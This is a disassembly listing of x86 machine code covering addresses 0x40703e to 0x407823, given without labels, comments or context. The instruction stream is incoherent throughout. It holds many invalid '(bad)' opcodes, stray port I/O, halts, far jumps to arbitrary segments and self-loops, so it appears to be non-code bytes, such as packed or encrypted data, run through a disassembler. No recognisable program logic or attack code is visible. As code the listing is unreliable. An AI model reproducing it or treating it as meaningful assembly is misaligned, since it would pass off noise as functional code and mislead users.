  40703e:	jae    0x407086
  407040:	dec    esi
  407041:	dec    ebx
  407042:	mov    dl,0x20
  407044:	jecxz  0x406fe8
  407046:	aad    0x14
  407048:	bound  esp,QWORD PTR [edx-0x47920c5a]
  40704e:	ret    0xfb3e
  407051:	psllw  mm7,QWORD PTR [ebx-0x7b]
  407055:	add    BYTE PTR [ebx+0x25],bl
  407058:	mov    ch,0x61
  40705a:	loop   0x4070a7
  40705c:	push   0x5b16bdec
  407061:	mov    dl,bl
  407063:	test   DWORD PTR [edi+0x2ded1182],edi
  407069:	xor    ecx,DWORD PTR [edi-0x2f96c0e3]
  40706f:	push   eax
  407070:	test   eax,0x1c05b611
  407075:	mov    eax,ds:0xdf899ca7
  40707a:	sub    al,0x9
  40707c:	dec    ecx
  40707d:	test   edi,ecx
  40707f:	pop    edi
  407080:	xchg   ecx,eax
  407081:	pop    ebp
  407082:	cmp    edi,ebx
  407084:	cmp    eax,0x4cd713a3
  407089:	inc    ecx
  40708a:	ins    DWORD PTR es:[edi],dx
  40708b:	popa   
  40708c:	out    0x73,al
  40708e:	in     al,0x0
  407090:	ja     0x4070b9
  407092:	and    al,0xe0
  407094:	int3   
  407095:	stos   DWORD PTR es:[edi],eax
  407096:	dec    ebp
  407097:	int    0x9c
  407099:	addr16 out 0xda,al
  40709c:	outs   dx,BYTE PTR ds:[esi]
  40709d:	aad    0xf2
  40709f:	cmp    al,0x95
  4070a1:	xor    BYTE PTR [ebx-0x618378cc],cl
  4070a7:	stos   DWORD PTR es:[edi],eax
  4070a8:	or     eax,0x798b4ab
  4070ad:	loopne 0x40705c
  4070af:	ret    0x2c4a
  4070b2:	jne    0x407121
  4070b4:	sbb    dh,al
  4070b6:	daa    
  4070b7:	in     eax,dx
  4070b8:	call   0x39df9724
  4070bd:	fbstp  TBYTE PTR [edi-0x53]
  4070c0:	stc    
  4070c1:	nop
  4070c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070c3:	lahf   
  4070c4:	or     eax,0xdd809f56
  4070c9:	push   0xffffffe2
  4070cb:	sbb    BYTE PTR [ebx-0x64],0xf5
  4070cf:	xchg   ebx,eax
  4070d0:	lods   al,BYTE PTR ds:[esi]
  4070d1:	pop    DWORD PTR [ecx-0x6e]
  4070d4:	popf   
  4070d5:	fistp  WORD PTR cs:[ecx+0x65e5dc82]
  4070dc:	idiv   BYTE PTR [esi]
  4070de:	loopne 0x407088
  4070e0:	(bad)  
  4070e1:	lds    ebp,FWORD PTR [ebx-0x6f4902cb]
  4070e7:	dec    eax
  4070e8:	xchg   esi,eax
  4070e9:	pop    esi
  4070ea:	push   ss
  4070eb:	mov    ecx,0x684965c8
  4070f0:	and    cl,BYTE PTR [ebx-0x426c275c]
  4070f6:	outs   dx,DWORD PTR ds:[esi]
  4070f7:	inc    BYTE PTR [ecx-0x3db53fd7]
  4070fd:	out    0xac,al
  4070ff:	std    
  407100:	neg    BYTE PTR [edi-0x61]
  407103:	add    DWORD PTR [ebx],esi
  407105:	or     al,bh
  407107:	inc    eax
  407108:	sbb    bl,dl
  40710a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40710b:	inc    ebp
  40710c:	nop
  40710d:	jecxz  0x40713a
  40710f:	cmp    DWORD PTR [bp+di],ebx
  407112:	ja     0x40716a
  407114:	outs   dx,BYTE PTR ds:[esi]
  407115:	sub    al,0xf3
  407117:	sbb    BYTE PTR [ecx],al
  407119:	push   cs
  40711a:	fild   WORD PTR [edi+0x40]
  40711d:	imul   ebp,eax,0xd688fe43
  407123:	cwde   
  407124:	mov    bh,0xd3
  407126:	mov    ebp,0xdefb309e
  40712b:	jmp    0x40713e
  40712d:	mov    DWORD PTR [edi],ecx
  40712f:	xchg   edx,eax
  407130:	test   eax,0xcdec8656
  407135:	add    DWORD PTR [eax+0x25],eax
  407138:	push   es
  407139:	ss pop ds
  40713b:	mov    cl,0xd5
  40713d:	jno    0x4071be
  40713f:	cmp    BYTE PTR [esi],ah
  407141:	push   0x71
  407143:	scas   al,BYTE PTR es:[edi]
  407144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407145:	stc    
  407146:	mov    BYTE PTR [edi+0x4],bh
  407149:	and    al,0x14
  40714b:	and    BYTE PTR [eax-0x33097b32],bh
  407151:	sti    
  407152:	fs sahf 
  407154:	repnz (bad) 
  407156:	jg     0x4071c2
  407158:	pop    ds
  407159:	jmp    0xc1e5:0x21682086
  407160:	adc    ebp,esi
  407162:	cmp    al,0x73
  407164:	push   es
  407165:	daa    
  407166:	dec    edx
  407167:	adc    bl,BYTE PTR [eax]
  407169:	iret   
  40716a:	mov    esp,0x9fdb73b6
  40716f:	fist   WORD PTR [esi-0x79b2ab4]
  407175:	jnp    0x407130
  407177:	push   0xf188e2c4
  40717c:	and    BYTE PTR [eax+0x6afe70b3],cl
  407182:	inc    eax
  407183:	xor    al,BYTE PTR [edi+0xf]
  407186:	test   al,bl
  407188:	scas   al,BYTE PTR es:[edi]
  407189:	(bad)  
  40718a:	stos   BYTE PTR es:[edi],al
  40718b:	mov    ds:0xbe25f2eb,eax
  407190:	ds test al,0xc0
  407193:	(bad)  
  407194:	sbb    esi,DWORD PTR [eax]
  407196:	xchg   edi,eax
  407197:	ror    esp,cl
  407199:	jnp    0x4071f6
  40719b:	icebp  
  40719c:	jl     0x40714c
  40719e:	shr    DWORD PTR [ebx-0x7746874b],1
  4071a4:	mov    dh,0x1d
  4071a6:	sti    
  4071a7:	stos   BYTE PTR es:[edi],al
  4071a8:	push   esp
  4071a9:	div    BYTE PTR [edi-0x62]
  4071ac:	test   edi,0x3df16264
  4071b2:	mov    edx,0x9fdf9343
  4071b7:	add    dl,BYTE PTR [ebp+0x16]
  4071ba:	jno    0x4071a5
  4071bc:	mov    ds:0x114ab27b,eax
  4071c1:	aad    0x76
  4071c3:	xchg   DWORD PTR [eax-0x1c],ebp
  4071c6:	and    BYTE PTR [ebx+ecx*2-0x1d],0x7d
  4071cb:	mov    BYTE PTR [ecx-0x38e32928],bh
  4071d1:	test   al,0x48
  4071d3:	push   ebp
  4071d4:	mov    bh,0xc
  4071d6:	lods   eax,DWORD PTR ds:[esi]
  4071d7:	jecxz  0x407230
  4071d9:	and    BYTE PTR [edi-0x60],ah
  4071dc:	mov    esi,DWORD PTR [edi-0x7f]
  4071df:	fiadd  DWORD PTR [esi]
  4071e1:	outs   dx,BYTE PTR cs:[esi]
  4071e3:	mov    esp,ebp
  4071e5:	leave  
  4071e6:	jg     0x407204
  4071e8:	call   0x112044d2
  4071ed:	add    BYTE PTR [edx-0x69],al
  4071f0:	outs   dx,DWORD PTR ds:[esi]
  4071f1:	pop    ss
  4071f2:	mov    BYTE PTR [esi+0x65b4b54d],cl
  4071f8:	add    eax,0xf52d74df
  4071fd:	jb     0x407219
  4071ff:	out    0xa0,al
  407201:	mov    ebx,0x2433cb23
  407206:	jmp    FWORD PTR [ecx+esi*4+0x47]
  40720a:	or     cl,BYTE PTR ds:0xc59a2bfb
  407210:	mov    eax,0x53b88216
  407215:	(bad)  
  407216:	and    al,0xee
  407218:	call   0xa257:0xb28bf56f
  40721f:	mov    esp,0x77c1a943
  407224:	stos   BYTE PTR es:[edi],al
  407225:	popf   
  407226:	stos   BYTE PTR es:[edi],al
  407227:	cwde   
  407228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407229:	(bad)  
  40722b:	shr    DWORD PTR [ebx-0x18],0x2f
  40722f:	or     eax,0x9efcd733
  407234:	outs   dx,DWORD PTR ds:[esi]
  407235:	imul   ebx,DWORD PTR [eax+edx*8-0x17],0x913f17
  40723d:	mov    eax,0x1ba8a282
  407242:	sub    al,0x74
  407244:	lock and al,0x9f
  407247:	adc    dh,dh
  407249:	out    0xcd,al
  40724b:	or     cl,0xbb
  40724e:	les    ecx,FWORD PTR [esi+esi*8+0x6e]
  407252:	add    BYTE PTR [esi-0x57],0xcd
  407256:	sbb    dl,BYTE PTR [eax+0x20a97870]
  40725c:	clc    
  40725d:	push   0x7b
  40725f:	lock test eax,0x1ac1f064
  407265:	inc    eax
  407266:	or     eax,0xa214d4f5
  40726b:	adc    al,0xa1
  40726d:	retf   
  40726e:	sub    DWORD PTR [ebx+eax*8+0x2f],edx
  407272:	loopne 0x4072ae
  407274:	shl    eax,cl
  407276:	pop    esi
  407277:	mov    dh,0xa1
  407279:	or     eax,0xfb0024d1
  40727e:	out    dx,al
  40727f:	outs   dx,DWORD PTR ds:[esi]
  407280:	je     0x4072fd
  407282:	lods   al,BYTE PTR ds:[esi]
  407283:	pop    ebx
  407284:	loope  0x40725a
  407286:	hlt    
  407287:	dec    BYTE PTR [ecx-0x32]
  40728a:	aam    0x2f
  40728c:	pop    ebx
  40728d:	retf   
  40728e:	jae    0x407304
  407290:	adc    DWORD PTR [edi-0x6c4d1e61],edx
  407296:	dec    esi
  407297:	and    DWORD PTR [edi+0x3f],0x64
  40729b:	cld    
  40729c:	loop   0x407224
  40729e:	loopne 0x4072e0
  4072a0:	test   BYTE PTR ds:0xeaacc06b,bh
  4072a6:	(bad)  
  4072a7:	jp     0x4072bc
  4072a9:	addr16 into 
  4072ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072ad:	add    al,0x41
  4072af:	push   ebp
  4072b0:	(bad)  
  4072b1:	pushf  
  4072b2:	or     esp,edx
  4072b4:	loopne 0x4072da
  4072b6:	stos   BYTE PTR es:[edi],al
  4072b7:	adc    DWORD PTR [edx-0x5579d1cf],0x48
  4072be:	inc    ebp
  4072bf:	xor    edi,DWORD PTR [ecx+0x47ea7a80]
  4072c5:	jbe    0x4072e2
  4072c7:	jmp    FWORD PTR [esi]
  4072c9:	mov    ah,0x74
  4072cb:	inc    ebx
  4072cc:	push   cs
  4072cd:	adc    ecx,DWORD PTR [ecx-0x1e]
  4072d0:	loopne 0x40725a
  4072d2:	and    DWORD PTR [ecx+eax*1+0x1e],edx
  4072d6:	sub    cl,bl
  4072d8:	ss js  0x40725e
  4072db:	test   ah,bh
  4072dd:	out    dx,eax
  4072de:	cmp    dh,BYTE PTR [edx-0x44dce5e4]
  4072e4:	sub    al,0xfe
  4072e6:	ins    BYTE PTR es:[edi],dx
  4072e7:	xor    eax,0xefcd9d57
  4072ec:	add    dh,0x74
  4072ef:	ja     0x40729c
  4072f1:	pushf  
  4072f2:	sub    eax,edi
  4072f4:	adc    al,cl
  4072f6:	pop    edx
  4072f7:	jge    0x40731e
  4072f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072fa:	and    DWORD PTR [ebp+eiz*4-0x652a4b66],edx
  407301:	and    al,0xa3
  407303:	jp     0x4072e2
  407305:	xchg   esi,eax
  407306:	in     al,dx
  407307:	popf   
  407308:	xor    eax,0x433526e
  40730d:	arpl   WORD PTR [ecx+edi*4-0xc8a55c5],bp
  407314:	add    al,0x2b
  407316:	(bad)  
  407317:	mov    ah,0x93
  407319:	xchg   DWORD PTR [edx-0x51d9c092],esp
  40731f:	loopne 0x4072b9
  407321:	pop    edi
  407322:	inc    ebx
  407323:	pop    ds
  407324:	add    edi,DWORD PTR [edi-0x6235d1c7]
  40732a:	adc    al,0xc7
  40732c:	or     bh,BYTE PTR [ecx]
  40732e:	mov    edx,0x86650a19
  407333:	repz (bad) 
  407335:	jmp    0xcb2a2c0a
  40733a:	pushf  
  40733b:	rcl    edi,0xb
  40733e:	mov    eax,ds:0xe52a38bc
  407343:	mov    ah,0xce
  407345:	int    0x14
  407347:	or     bl,al
  407349:	mov    cl,0xa9
  40734b:	xlat   BYTE PTR ds:[ebx]
  40734c:	jne    0x4073b8
  40734e:	fisubr DWORD PTR [eax]
  407350:	lds    ecx,FWORD PTR [esi+0x6e]
  407353:	jmp    0x407353
  407355:	dec    ebx
  407356:	xchg   DWORD PTR [eax-0x51],edx
  407359:	add    eax,0xacb9e8e5
  40735e:	(bad)  
  40735f:	cli    
  407360:	sbb    eax,0xc5d91227
  407365:	cmp    eax,0x1f1390cf
  40736a:	push   esp
  40736b:	dec    edi
  40736c:	in     al,dx
  40736d:	mov    ah,0xf7
  40736f:	jecxz  0x407306
  407371:	xchg   esi,eax
  407372:	cdq    
  407373:	xchg   ebp,eax
  407374:	push   esp
  407375:	stos   DWORD PTR es:[edi],eax
  407376:	pusha  
  407377:	loopne 0x4073e0
  407379:	or     DWORD PTR [ebp+eiz*1+0x2f00e2d1],ebx
  407380:	fstp   DWORD PTR [esp+edi*1]
  407383:	rcl    BYTE PTR [edx],1
  407385:	add    al,0x48
  407387:	lahf   
  407388:	mov    ch,0xeb
  40738a:	aad    0xd1
  40738c:	xchg   esi,eax
  40738d:	sbb    eax,0x3ef85255
  407392:	push   esi
  407393:	push   esp
  407394:	inc    edx
  407395:	mov    esp,0x57bafb95
  40739a:	stc    
  40739b:	or     al,0x3f
  40739d:	or     bl,BYTE PTR [edx]
  40739f:	xchg   esp,eax
  4073a0:	mov    WORD PTR [edx],es
  4073a2:	nop
  4073a3:	pop    ebp
  4073a4:	cmp    esp,DWORD PTR [ecx-0x460656e2]
  4073aa:	fsubr  QWORD PTR [ebx]
  4073ac:	cmp    BYTE PTR [edi-0x527aa79],al
  4073b2:	jno    0x4073f3
  4073b4:	add    esp,edx
  4073b6:	lods   eax,DWORD PTR ds:[esi]
  4073b7:	push   es
  4073b8:	mov    ch,0xc2
  4073ba:	out    dx,eax
  4073bb:	mov    dl,0x1c
  4073bd:	pop    ebp
  4073be:	sbb    esi,DWORD PTR [ecx-0x3f633f98]
  4073c4:	dec    edi
  4073c5:	cmp    BYTE PTR [esi],ah
  4073c7:	mov    ebx,0x56932a1d
  4073cc:	and    al,0x44
  4073ce:	cmp    esp,edx
  4073d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d1:	inc    ebp
  4073d2:	sbb    al,0xeb
  4073d4:	std    
  4073d5:	pushf  
  4073d6:	aaa    
  4073d7:	or     esp,DWORD PTR [ecx*8-0x8709caa]
  4073de:	xchg   ebp,eax
  4073df:	arpl   bx,bp
  4073e1:	popf   
  4073e2:	add    eax,0x3abda81e
  4073e7:	jecxz  0x40739d
  4073e9:	int    0xb8
  4073eb:	and    cl,BYTE PTR [edi-0x1d]
  4073ee:	fnstcw WORD PTR [edx-0x6b54df04]
  4073f4:	adc    ebp,DWORD PTR [edx+0x4f6ad9e4]
  4073fa:	xchg   edi,eax
  4073fb:	xor    BYTE PTR [ecx+eiz*8+0x6a3454da],bh
  407402:	mov    ecx,0x9113eed2
  407407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407408:	mov    ecx,0x8c156544
  40740d:	cwde   
  40740e:	and    edi,esp
  407410:	ins    DWORD PTR es:[edi],dx
  407411:	pushf  
  407412:	jle    0x40742f
  407414:	idiv   DWORD PTR [edi-0x3a]
  407417:	jne    0x40748c
  407419:	pop    DWORD PTR [ecx]
  40741b:	rcr    BYTE PTR [ebx+edi*8],0x10
  40741f:	mov    ah,0xfd
  407421:	ins    BYTE PTR es:[edi],dx
  407422:	scas   eax,DWORD PTR es:[edi]
  407423:	fild   DWORD PTR ds:0xd2b7eb6d
  407429:	or     BYTE PTR [edi+0x4],dl
  40742c:	push   ebx
  40742d:	pop    ds
  40742e:	and    esp,esi
  407430:	add    edx,esp
  407432:	xor    esp,esp
  407434:	and    edi,DWORD PTR [ecx]
  407436:	jmp    0x7929cc2c
  40743b:	mov    esp,0x21b6aad8
  407440:	adc    DWORD PTR [edi],esp
  407442:	ins    BYTE PTR es:[edi],dx
  407443:	mov    bl,0x9f
  407445:	push   ds
  407446:	adc    al,0x80
  407448:	lds    edi,FWORD PTR [edi-0x46]
  40744b:	cmp    DWORD PTR gs:[ecx-0x54],ebp
  40744f:	adc    edi,ebx
  407451:	pop    esp
  407452:	and    BYTE PTR [ecx-0x7304de98],ch
  407458:	dec    edx
  407459:	mov    ebp,0x15f2e67a
  40745e:	mul    BYTE PTR [esp+eax*2-0x1fc7c44c]
  407465:	test   eax,0x9b69360c
  40746a:	xor    eax,0x18b25c55
  40746f:	aas    
  407470:	xlat   BYTE PTR ds:[ebx]
  407471:	or     al,ah
  407473:	rcr    DWORD PTR [ecx+0x50],1
  407476:	gs daa 
  407478:	adc    DWORD PTR [edi-0x300dab8a],edx
  40747e:	shr    DWORD PTR [ebp+0x77],cl
  407481:	push   edx
  407482:	pop    ecx
  407483:	outs   dx,BYTE PTR ds:[esi]
  407484:	add    DWORD PTR [esi-0x642d3f70],edx
  40748a:	mov    dh,0x67
  40748c:	fst    DWORD PTR [edx+0x1c]
  40748f:	lahf   
  407490:	dec    edi
  407491:	jno    0x40742b
  407493:	xor    BYTE PTR [edx-0x30e41c15],bh
  407499:	jecxz  0x4074ae
  40749b:	mov    ch,0x30
  40749d:	(bad)  
  40749e:	aad    0x96
  4074a0:	cmp    eax,DWORD PTR [edi]
  4074a2:	cmp    al,0xc5
  4074a4:	jns    0x40744d
  4074a6:	dec    ebp
  4074a7:	jmp    0x5eb7:0x8e7e5e78
  4074ae:	aad    0xba
  4074b0:	daa    
  4074b1:	ss sub ch,dl
  4074b4:	or     al,0xbb
  4074b6:	jmp    0x407490
  4074b8:	push   eax
  4074b9:	xchg   edi,eax
  4074ba:	call   0xf3a199bb
  4074bf:	sbb    BYTE PTR [esp+edi*1],bl
  4074c2:	cli    
  4074c3:	mov    ebp,0x81d64242
  4074c8:	mov    bl,0x9e
  4074ca:	cwde   
  4074cb:	or     eax,0x398d2ad2
  4074d0:	fadd   DWORD PTR [ebx]
  4074d2:	mov    dh,0xce
  4074d4:	pop    es
  4074d5:	xchg   esp,eax
  4074d6:	mov    ecx,0x9ad1958a
  4074db:	mov    ebx,0xff677c99
  4074e0:	or     eax,edx
  4074e2:	sahf   
  4074e3:	mov    ds:0xfa7049ae,eax
  4074e8:	ror    DWORD PTR [ebx+0xd7aeb59],0x86
  4074ef:	dec    ecx
  4074f0:	lock mov ds:0x2be00dd8,al
  4074f6:	or     edx,DWORD PTR [eax-0x46e18f12]
  4074fc:	ja     0x40748d
  4074fe:	jb     0x407574
  407500:	dec    DWORD PTR [ecx+0x4ac9d502]
  407506:	xor    BYTE PTR [edx-0x60],cl
  407509:	inc    edi
  40750a:	shl    ebx,0xcd
  40750d:	stos   BYTE PTR es:[edi],al
  40750e:	mov    dh,0x65
  407510:	dec    edx
  407511:	lock xchg edi,eax
  407513:	(bad)  
  407514:	and    DWORD PTR ds:0x2e079e3f,ebx
  40751a:	nop
  40751b:	inc    eax
  40751c:	(bad)  
  40751d:	(bad)  [edi+0x95f0609]
  407523:	dec    edx
  407524:	pop    eax
  407525:	mov    esp,0x884475ab
  40752a:	std    
  40752b:	push   ebp
  40752c:	push   ecx
  40752d:	add    edx,ecx
  40752f:	push   0x71
  407531:	inc    edi
  407532:	bound  eax,QWORD PTR [ecx+0x23]
  407535:	ret    0x42b4
  407538:	push   0x1f80ebdf
  40753d:	cwde   
  40753e:	mov    al,0xed
  407540:	ins    BYTE PTR es:[edi],dx
  407541:	in     al,0x59
  407543:	pop    edi
  407544:	xchg   BYTE PTR ds:0xf9eb7c11,cl
  40754a:	nop
  40754b:	xchg   esp,eax
  40754c:	cmc    
  40754d:	and    eax,0xc6930d39
  407552:	and    ch,al
  407554:	mov    edi,0x222aa4c6
  407559:	out    0x45,al
  40755b:	aam    0xb9
  40755d:	(bad)  
  40755e:	jmp    0xc255:0xea7bcba4
  407565:	or     cl,BYTE PTR [eax-0x78cd764e]
  40756b:	fisub  WORD PTR [ebx-0x3871bf72]
  407571:	adc    BYTE PTR [edi+0x567d87fc],bl
  407577:	ss mov esp,0xdefa0c3d
  40757d:	cli    
  40757e:	icebp  
  40757f:	icebp  
  407580:	jl     0x407601
  407582:	rep lods al,BYTE PTR ds:[esi]
  407584:	xor    al,0x95
  407586:	cs cmp eax,0xf1246c53
  40758c:	xchg   BYTE PTR [eax+0x78c8a7bf],dh
  407592:	frstor [ecx-0x745568b]
  407598:	outs   dx,DWORD PTR ds:[esi]
  407599:	add    bl,cl
  40759b:	push   ebx
  40759c:	mov    ebp,gs
  40759e:	jo     0x40760a
  4075a0:	cmovs  esi,DWORD PTR [esi]
  4075a3:	jg     0x4075cd
  4075a5:	xor    eax,0x643238e3
  4075aa:	fnstenv [eax]
  4075ac:	jb     0x4075e5
  4075ae:	icebp  
  4075af:	loop   0x4075ee
  4075b1:	data16 add ch,BYTE PTR [esi]
  4075b4:	push   esi
  4075b5:	push   edx
  4075b6:	push   ss
  4075b7:	cmp    edx,ebx
  4075b9:	and    DWORD PTR [eax],edx
  4075bb:	in     al,dx
  4075bc:	call   0x3ed0:0xc9a6ee4b
  4075c3:	dec    ebp
  4075c4:	sub    eax,0xd759ab3f
  4075c9:	push   ebx
  4075ca:	ret    0xb42b
  4075cd:	dec    bx
  4075cf:	adc    al,0x50
  4075d1:	add    ch,BYTE PTR [edi]
  4075d3:	pop    edx
  4075d4:	(bad)  
  4075d5:	mov    WORD PTR [eax],ss
  4075d7:	lods   ax,WORD PTR ds:[esi]
  4075d9:	mov    cl,0xa2
  4075db:	data16 cmc 
  4075dd:	and    al,0x48
  4075df:	add    eax,DWORD PTR [edx+ebp*8+0x72]
  4075e3:	add    edx,DWORD PTR [ecx]
  4075e5:	add    eax,0x12e4184f
  4075ea:	hlt    
  4075eb:	pop    ds
  4075ec:	inc    edi
  4075ed:	cld    
  4075ee:	and    dh,BYTE PTR [ebp-0x16b45e1f]
  4075f4:	xchg   esp,eax
  4075f5:	cmp    bl,BYTE PTR [eax+0x41]
  4075f8:	jno    0x407627
  4075fa:	mov    eax,edx
  4075fc:	adc    DWORD PTR [esi+0x218ef724],0x73142762
  407606:	mov    esi,DWORD PTR [esi+edi*4]
  407609:	scas   eax,DWORD PTR es:[edi]
  40760a:	mov    es,WORD PTR [ebp+0x290990a5]
  407610:	inc    ebp
  407611:	sub    eax,0x28971fe8
  407616:	(bad)  
  407617:	dec    edi
  407618:	inc    esi
  407619:	dec    esp
  40761a:	sub    eax,eax
  40761c:	xor    al,0xfb
  40761e:	retf   
  40761f:	push   cs
  407620:	mov    edi,0xd6ff7e7
  407625:	outs   dx,BYTE PTR ds:[esi]
  407626:	add    BYTE PTR [edi+0x35e728f2],ah
  40762c:	mov    dh,0x21
  40762e:	jmp    0x4075b7
  407630:	or     BYTE PTR [ebx-0x7b],dl
  407633:	(bad)  
  407634:	xor    esi,DWORD PTR [edi+0x5f3b2377]
  40763a:	inc    ebp
  40763b:	inc    edx
  40763c:	out    dx,eax
  40763d:	(bad)  
  40763e:	and    dl,bl
  407640:	in     al,dx
  407641:	dec    ecx
  407642:	cdq    
  407643:	sbb    dl,BYTE PTR [ebp-0x607fcb7f]
  407649:	rol    DWORD PTR [eax+esi*4+0x559b956f],1
  407650:	mov    bh,0x5f
  407652:	add    eax,0x5f90cfb7
  407657:	retf   
  407658:	jbe    0x407633
  40765a:	aas    
  40765b:	cmc    
  40765c:	mov    esi,0x89377767
  407661:	cdq    
  407662:	stc    
  407663:	test   DWORD PTR [edx],ebx
  407665:	stos   DWORD PTR es:[edi],eax
  407666:	add    DWORD PTR [ebp+0x4a00a6c],eax
  40766c:	adc    BYTE PTR [ebx],bl
  40766e:	cmp    eax,0xadc36ec4
  407673:	or     ah,BYTE PTR [ecx-0x2f484b3a]
  407679:	ins    DWORD PTR es:[edi],dx
  40767a:	imul   esi,edx,0xf7641cf3
  407680:	imul   edi,DWORD PTR [ebx],0x2b52803e
  407686:	out    dx,al
  407687:	add    eax,0xc415db2f
  40768c:	fsub   DWORD PTR [edx+0x33]
  40768f:	sub    bl,bl
  407691:	push   ds
  407692:	adc    ebp,DWORD PTR [esi+0x16010bf2]
  407698:	jbe    0x40764e
  40769a:	mov    ebx,0xd78dc388
  40769f:	push   edi
  4076a0:	les    ecx,FWORD PTR [ebp-0x3e]
  4076a3:	stc    
  4076a4:	outs   dx,BYTE PTR ds:[esi]
  4076a5:	ret    
  4076a6:	jmp    0x5eefd4c
  4076ab:	xor    BYTE PTR [ebx-0x23],cl
  4076ae:	cwde   
  4076af:	ja     0x40770c
  4076b1:	and    al,0x64
  4076b4:	enter  0xa733,0x53
  4076b8:	and    BYTE PTR ss:[esi],dh
  4076bb:	mov    dl,0x32
  4076bd:	ja     0x40766f
  4076bf:	mov    dl,BYTE PTR [ebx-0x4505a7e2]
  4076c5:	fisubr WORD PTR [edi]
  4076c8:	push   0x16
  4076ca:	mov    esi,0xba1e1838
  4076cf:	pop    ss
  4076d0:	retf   
  4076d1:	xor    eax,0xdea6aa97
  4076d6:	outs   dx,DWORD PTR ds:[esi]
  4076d7:	and    eax,0xdd070b47
  4076dc:	and    al,0x47
  4076de:	adc    ecx,esp
  4076e0:	pop    ebp
  4076e1:	or     BYTE PTR [ecx+0x6b],dh
  4076e4:	dec    edi
  4076e5:	fadd   DWORD PTR [ebx+0x65]
  4076e8:	xchg   BYTE PTR [eax+0x638ea3ae],ch
  4076ee:	orps   xmm5,xmm7
  4076f1:	pop    es
  4076f2:	sbb    eax,0xbecfc504
  4076f7:	jmp    0x4076f4
  4076f9:	inc    esp
  4076fa:	leave  
  4076fb:	lea    ebp,[ebp+esi*8+0x46fec8b3]
  407702:	xlat   BYTE PTR ds:[ebx]
  407703:	pop    esi
  407704:	jle    0x40773a
  407706:	mov    dh,0xe7
  407708:	sbb    dl,BYTE PTR [ecx-0x2d4f6a92]
  40770e:	stos   BYTE PTR es:[edi],al
  40770f:	mov    al,ds:0x7c718dd2
  407714:	cmp    al,0x3b
  407716:	inc    esp
  407717:	jp     0x407757
  407719:	cli    
  40771a:	inc    edx
  40771b:	repz jnp 0x40773c
  40771e:	xchg   eax,esi
  407720:	inc    ebp
  407721:	cld    
  407722:	inc    esp
  407723:	inc    BYTE PTR [esi]
  407725:	jne    0x40775e
  407727:	dec    eax
  407728:	popa   
  407729:	js     0x40772a
  40772b:	xchg   esi,eax
  40772c:	push   0x38972230
  407731:	out    dx,eax
  407732:	dec    esp
  407733:	scas   eax,DWORD PTR es:[edi]
  407734:	cmc    
  407735:	cld    
  407736:	xor    al,0x1a
  407738:	mov    ch,0xaf
  40773a:	mov    ds:0x66279fa9,eax
  40773f:	out    dx,al
  407740:	ret    
  407741:	in     eax,dx
  407742:	xchg   edx,eax
  407743:	test   BYTE PTR [eax],bh
  407745:	in     al,0x34
  407747:	push   ss
  407748:	ja     0x4076ea
  40774a:	pop    es
  40774b:	shr    DWORD PTR [esi],1
  40774d:	inc    ebp
  40774e:	ja     0x4076ee
  407750:	in     eax,dx
  407751:	pop    es
  407752:	into   
  407753:	daa    
  407754:	mov    ds:0xea162377,eax
  407759:	push   ss
  40775a:	xor    esp,DWORD PTR [edi]
  40775c:	out    dx,eax
  40775d:	xchg   BYTE PTR [edx-0x40],al
  407760:	data16 jns 0x407785
  407763:	ja     0x407738
  407765:	sub    bl,BYTE PTR [ebp-0x4e]
  407768:	jne    0x4077a7
  40776a:	add    DWORD PTR [esi-0x15],eax
  40776d:	mov    ecx,0x339b6a73
  407772:	call   0x50038784
  407777:	out    dx,eax
  407778:	adc    edx,DWORD PTR ds:[edi+eax*8-0x46ddb2d1]
  407780:	or     esi,DWORD PTR [ebx+0x5d2e4be4]
  407786:	jge    0x40778f
  407788:	xor    eax,0x5f2cd45c
  40778d:	fld    TBYTE PTR [esi]
  40778f:	mov    BYTE PTR [esi-0x16],dl
  407792:	mov    ds:0x49274be2,al
  407797:	shr    al,1
  407799:	in     eax,0xbb
  40779b:	out    dx,al
  40779c:	es sbb esp,edi
  40779f:	inc    ebp
  4077a0:	test   DWORD PTR [ebx+0x21d4feee],edi
  4077a6:	dec    eax
  4077a7:	hlt    
  4077a8:	in     eax,0x57
  4077aa:	cs cs stos DWORD PTR es:[edi],eax
  4077ad:	mov    dh,0x3c
  4077af:	mov    edx,0x5297b360
  4077b4:	or     esp,DWORD PTR [esi-0x72e890bc]
  4077ba:	sbb    BYTE PTR [ebp-0x9],bl
  4077bd:	adc    eax,0x490a6bea
  4077c2:	fwait
  4077c3:	pop    ds
  4077c4:	daa    
  4077c5:	in     eax,dx
  4077c6:	jb     0x4b8be707
  4077cc:	xchg   ecx,eax
  4077cd:	cmp    DWORD PTR ds:0xa9900dee,esp
  4077d3:	cmp    eax,DWORD PTR [eax]
  4077d5:	jg     0x407779
  4077d7:	inc    ebp
  4077d8:	popa   
  4077d9:	fisubr WORD PTR [esi+0x6f761b00]
  4077df:	test   eax,0x6dc86c58
  4077e4:	stos   DWORD PTR es:[edi],eax
  4077e5:	scas   eax,DWORD PTR es:[edi]
  4077e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077e7:	inc    ebx
  4077e8:	push   esp
  4077e9:	loopne 0x4077fc
  4077eb:	pop    ecx
  4077ec:	js     0x407819
  4077ee:	push   ds
  4077ef:	jne    0x40778c
  4077f1:	inc    ebp
  4077f2:	jmp    0x5f71967a
  4077f7:	or     ch,0x6c
  4077fa:	daa    
  4077fb:	jmp    0xc8b6:0x19b162b1
  407802:	call   FWORD PTR [edx-0x46]
  407805:	xlat   BYTE PTR ds:[ebx]
  407806:	inc    esi
  407807:	retf   0xbced
  40780a:	leave  
  40780b:	push   0x7e
  40780d:	pop    ss
  40780e:	inc    BYTE PTR [eax]
  407810:	adc    BYTE PTR [ebx+0x1c],dh
  407813:	dec    ecx
  407814:	and    eax,DWORD PTR [ebp+0x201ab50c]
  40781a:	pop    eax
  40781b:	dec    ecx
  40781c:	pushf  
  40781d:	sbb    BYTE PTR [edi+edi*8],bl
  407820:	pop    esi
  407821:	out    0x6c,eax
  407823:	xchg   edx,eax
